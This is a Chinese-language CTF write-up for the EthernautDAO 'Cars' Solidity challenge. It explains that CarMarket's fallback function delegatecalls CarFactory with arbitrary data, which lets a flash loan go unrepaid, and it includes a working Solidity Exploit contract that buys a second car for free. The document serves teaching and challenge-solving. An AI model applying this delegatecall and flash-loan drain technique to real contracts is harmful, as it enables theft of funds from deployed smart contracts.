## 合约

Twitter Link:https://twitter.com/EthernautDAO/status/1548638648974749696

- [CarToken.sol](https://github.com/Poor4ever/EthernautDAO-Twitter-Solution/blob/main/src/Cars/CarToken.sol) 
- [CarMarket.sol](https://github.com/Poor4ever/EthernautDAO-Twitter-Solution/blob/main/src/Cars/CarMarket.sol) 
- [CarFactory.sol](https://github.com/Poor4ever/EthernautDAO-Twitter-Solution/blob/main/src/Cars/CarFactory.sol) 

## 完成题目条件

需要从 CarMarket 合约购买两辆车.

## 解题

初始你没有任何 CarToken,只能通过 mint() 函数获取 1 个token, CarMarket 和 CarFactory 合约各有 100000 Token

`CarToken` 是一个 ERC20 Token 合约,用于从 CarMarket 购买车辆,挑战者只能通过 mint() 函数获得 1 个Token.

`CarMarket` 通过 purchaseCar() 函数购买车辆, _carCost() 判断如果是第一次购买只需要 1 个 Token,不是第一购买需要支付 100000 个 Token,CarFactory 合约给购买过车辆的用户提供免费的闪电贷.

```solidity
    fallback() external {
       carMarket = ICarMarket(address(this));
       carToken.approve(carFactory, carToken.balanceOf(address(this)));
       (bool success, ) = carFactory.delegatecall(msg.data);
       require(success, "Delegate call failed");
    }
```

问题出在 `CarMarket` 的回退函数委托调用我们是可以任意输入的,如果通过它去委托调用 `CarFactory` 的 flashLoan() 函数,执行的上下文是在 `CarMarket` 合约,收到的是 `CarMarket` 合约 transfer() 的 CarToken ,回调 receivedCarToken() 后,判断的是 `CarFactory` 合约 CarToken 余额有没有变化,即我们可以不用偿还,完成这次闪电贷,从 `CarMarket` 购买第二辆车.

编写 Exp 测试完成挑战

forge test -vvv

[Car.t.sol](https://github.com/Poor4ever/EthernautDAO-Twitter-Solution/blob/main/src/test/Car.t.sol) 

```solidity
contract Exploit {
    CarToken token;
    CarFactory factory;
    CarMarket market;

    constructor(CarToken _tokenAddr, CarFactory _factoryAddr, CarMarket _marketAddr) {
        token = _tokenAddr;
        factory = _factoryAddr;
        market = _marketAddr;
    }
    
    function start() public {
        bytes memory flashLoan_func_sign = abi.encodeWithSelector(factory.flashLoan.selector, 100_000 ether, address(this));

        token.mint();
        token.approve(address(market), type(uint256).max);
        market.purchaseCar("TESLA", "Black", "TEST123");
        address(market).call(flashLoan_func_sign);
        market.purchaseCar("DMC-12", "Silver", "OUTATIME");
    }
    
    function receivedCarToken(address _factoryAddr) public returns(bool) {
        return true;
    }

}
```
